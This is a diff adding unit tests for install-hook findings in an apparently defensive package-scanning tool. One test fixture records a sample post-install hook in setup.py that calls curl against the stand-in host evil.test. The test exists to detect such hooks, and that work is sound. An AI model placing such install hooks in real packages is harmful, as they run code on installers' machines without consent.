@@ -10,6 +10,8 @@ from nidhogg.core.models import (
     BinaryFormat,
     FileAnalysis,
     FileTag,
+    InstallHookFinding,
+    InstallHookSource,
     PackageAnalysis,
     UrlFinding,
     UrlTag,
@@ -90,3 +92,30 @@ def test_binaryformat_values_are_stable() -> None:
 def test_packageanalysis_binaries_defaults_empty_list() -> None:
     pkg = PackageAnalysis(name="p", path=Path("/p"))
     assert pkg.binaries == []
+
+
+def test_installhookfinding_holds_all_fields() -> None:
+    finding = InstallHookFinding(
+        filepath=Path("setup.py"),
+        lineno=14,
+        call="subprocess.Popen",
+        command="subprocess.Popen(['curl', 'http://evil.test'])",
+        context="PostInstall.run",
+        source=InstallHookSource.SETUP_PY,
+    )
+    assert finding.filepath == Path("setup.py")
+    assert finding.lineno == 14
+    assert finding.call == "subprocess.Popen"
+    assert finding.command == "subprocess.Popen(['curl', 'http://evil.test'])"
+    assert finding.context == "PostInstall.run"
+    assert finding.source is InstallHookSource.SETUP_PY
+
+
+def test_installhooksource_values_are_stable() -> None:
+    assert InstallHookSource.SETUP_PY.value == "setup_py"
+    assert InstallHookSource.PACKAGE_INIT.value == "package_init"
+
+
+def test_packageanalysis_install_hooks_defaults_empty_list() -> None:
+    pkg = PackageAnalysis(name="p", path=Path("/p"))
+    assert pkg.install_hooks == []
